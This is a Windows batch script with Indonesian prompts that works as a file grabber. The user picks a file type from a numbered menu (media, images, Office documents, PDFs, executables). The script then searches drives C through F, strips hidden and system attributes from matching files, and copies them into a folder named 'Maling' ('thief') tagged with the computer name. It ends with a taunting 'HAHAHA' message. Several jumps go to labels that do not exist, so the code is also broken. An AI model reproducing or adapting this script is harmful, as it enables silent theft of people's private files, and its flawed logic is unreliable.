echo off
color 0a
mode 25,10
if "%1"=="/?" goto Sej
if not "%n%" == "" set n=
:MetDtg
cls
title WILLIAMANDREA V 3.9
:awal
echo.
set/p "pil=MASUKKAN KODE : "
if %pil%=='' goto option
if %pil%==1 goto 3gp
if %pil%==2 goto wmv
if %pil%==3 goto avi
if %pil%==4 goto jpg
if %pil%==5 goto rm
if %pil%==6 goto mpg
if %pil%==7 goto docx
if %pil%==8 goto xls
if %pil%==9 goto keluar
if %pil%==10 goto exe
if %pil%==11 goto mp4
if %pil%==12 goto pptx
if %pil%==13 goto png
if %pil%==14 goto pdf

goto option
:3gp
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.3gp') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
cls
echo DONE.
pause >nul


goto option
:wmv
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.wmv') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
cls
echo DONE.
pause >nul


goto option
:avi
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.avi') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
cls
echo DONE.
pause >nul

goto option
:jpg
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.jpg') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:rm
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.rm') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
cls
echo DONE.
pause >nul

goto option
:mpg
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.mpg') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:docx
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.docx') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:xls
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.xls') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:exe
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.exe') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:mp4
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.mp4') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:pptx
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.pptx') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:png
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.png') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:pdf
Set Maling=%computername%_%random%
If not exist "%Maling%" Md "%Maling%"
For %%a in (C D E F) do if exist %%a:\ (
For /f "tokens=*" %%b in ('dir /a /b /s %%a:\*.pdf') do (
attrib -s -h -r "%%b"
copy "%%b" "%Maling%" /y)
)
echo DONE.
pause >nul
cls

goto option
:keluar
msg * HAHAHAHAHAHAHA!!!
Exit